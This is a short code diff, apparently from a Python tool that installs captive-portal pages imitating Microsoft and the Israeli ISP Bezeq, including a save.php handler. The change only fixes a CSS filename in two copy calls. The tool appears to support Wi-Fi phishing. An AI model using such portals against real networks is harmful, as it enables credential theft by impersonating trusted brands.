@@ -262,7 +262,7 @@ def setup_captive_portal_files(Cap: str):
             shutil.copy("Microsoft/microsoft.svg", os.path.join(portal_dir, "microsoft.svg"))
         if Cap == "bezeq": 
             shutil.copy("Bezeq/index.html", os.path.join(portal_dir, "index.html"))
-            shutil.copy("Bezeq/ghh.css", os.path.join(portal_dir, "ghh.css"))
+            shutil.copy("Bezeq/ggh.css", os.path.join(portal_dir, "ghh.css"))
             shutil.copy("Bezeq/save.php", os.path.join(portal_dir, "save.php"))
             shutil.copy("Bezeq/route_simple.png", os.path.join(portal_dir, "route_simple.png"))
             shutil.copy("Bezeq/sn.png", os.path.join(portal_dir, "sn.png"))
@@ -297,7 +297,7 @@ def setup_captive_portal_files_dual(Cap: str):
             shutil.copy("Microsoft/Dual/microsoft.svg", os.path.join(portal_dir, "microsoft.svg"))
         if Cap == "bezeq": 
             shutil.copy("Bezeq/Dual/index.html", os.path.join(portal_dir, "index.html"))
-            shutil.copy("Bezeq/Dual/ghh.css", os.path.join(portal_dir, "ghh.css"))
+            shutil.copy("Bezeq/Dual/ggh.css", os.path.join(portal_dir, "ghh.css"))
             shutil.copy("Bezeq/Dual/save.php", os.path.join(portal_dir, "save.php"))
             shutil.copy("Bezeq/Dual/route_simple.png", os.path.join(portal_dir, "route_simple.png"))
             shutil.copy("Bezeq/Dual/sn.png", os.path.join(portal_dir, "sn.png"))
